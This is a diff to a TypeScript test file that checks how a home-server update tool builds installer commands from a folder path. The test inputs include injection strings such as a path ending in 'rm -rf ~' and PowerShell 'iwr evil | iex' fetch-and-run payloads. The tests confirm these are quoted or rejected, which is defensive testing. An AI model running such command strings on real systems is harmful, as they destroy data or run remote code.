@@ -5,9 +5,9 @@ import { afterEach, describe, expect, it } from "vitest";
 import type { NodeSummary } from "../api/types";
 import {
   ACTIVE_ROW_STATES, DISMISS_AFTER_S, FINAL_STATUSES, HUB_UPDATE_KEY, NO_WORD_AFTER_S, PHASES, PHASE_LABELS, RESTART_PHASES,
-  RUN_ID_PATTERN, SHA_PATTERN, SUCCESS_STATUSES, ago, canCheck, clearHubUpdate, formatElapsed, hubUpdateRecord, installerCommand,
-  isRunId, isSha, panelState, phaseLabel, readHubUpdate, reconcileHubUpdate, shQuote, shortDate, shortSha, splitCode,
-  updatableCheck, updateLogText, writeHubUpdate,
+  RUN_ID_PATTERN, SHA_PATTERN, SUCCESS_STATUSES, ago, canCheck, clearHubUpdate, commandSourceDir, formatElapsed, hubUpdateRecord,
+  installerCommand, isRunId, isSha, panelState, phaseLabel, readHubUpdate, reconcileHubUpdate, safeInstallerCommand, shQuote, shortDate,
+  shortSha, splitCode, updatableCheck, updateLogText, writeHubUpdate,
 } from "../lib/update";
 import { MIN, NOW, SHA_B, build, hubNode, iso, node, report, result, row, stored, storedError } from "./updateFixtures";
 
@@ -68,6 +68,38 @@ describe("phaseLabel", () => {
     expect(phaseLabel("constructor")).toBe("constructor");
     expect(phaseLabel("__proto__")).toBe("__proto__");
     expect(phaseLabel("tostring")).toBe("tostring");
+  });
+});
+
+describe("commands built from a reported source folder", () => {
+  const PLACEHOLDER_WIN = "cd <HomeMesh source folder>; powershell -ExecutionPolicy Bypass -File deploy\\windows\\install.ps1 -Upgrade";
+  it("keeps ordinary folders, including spaces, apostrophes and non-ASCII names", () => {
+    expect(commandSourceDir("windows", "C:\\Users\\Ann O'Neil\\src\\Łódź HomeMesh")).toBe("C:\\Users\\Ann O'Neil\\src\\Łódź HomeMesh");
+    expect(commandSourceDir("linux", "/home/ann/My Projects/Home'Mesh")).toBe("/home/ann/My Projects/Home'Mesh");
+    expect(commandSourceDir("linux", "/srv/a$b;rm -rf ~")).toBe("/srv/a$b;rm -rf ~"); // shlex-quoted: inert
+    expect(safeInstallerCommand("linux", "/srv/a$b;rm -rf ~", { pull: true }))
+      .toBe("cd '/srv/a$b;rm -rf ~' && git pull --ff-only && ./deploy/linux/install.sh --upgrade");
+  });
+  it("never puts what PowerShell expands inside double quotes into the Windows command", () => {
+    for (const dir of ["C:\\x\"; iwr evil | iex; \"", "C:\\Users\\$(iwr evil|iex)\\HomeMesh", "C:\\src\\$HomeMesh",
+      "C:\\src\\`$x", "C:\\src\\Home[1]", "C:\\x\u201d; iwr evil | iex; \u201c"]) {
+      expect(commandSourceDir("windows", dir)).toBeNull();
+      expect(safeInstallerCommand("windows", dir)).toBe(PLACEHOLDER_WIN);
+    }
+  });
+  it("never builds a command from a folder with hidden or bidirectional characters", () => {
+    for (const ch of ["\u202e", "\u2067", "\u200b", "\n", "\u0007"]) {
+      expect(commandSourceDir("linux", `/home/ann/src${ch}/HomeMesh`)).toBeNull();
+      expect(commandSourceDir("windows", `C:\\src${ch}\\HomeMesh`)).toBeNull();
+    }
+    expect(safeInstallerCommand("linux", "/home/ann/\u202esrc")).toBe("cd <HomeMesh source folder> && ./deploy/linux/install.sh --upgrade");
+  });
+  it("is the mirrored installer command otherwise", () => {
+    for (const c of mirror.installer_commands) {
+      if (commandSourceDir(c.os, c.source_dir) === (c.source_dir || null)) {
+        expect(safeInstallerCommand(c.os, c.source_dir, { pull: c.pull })).toBe(c.expected);
+      }
+    }
   });
 });
 
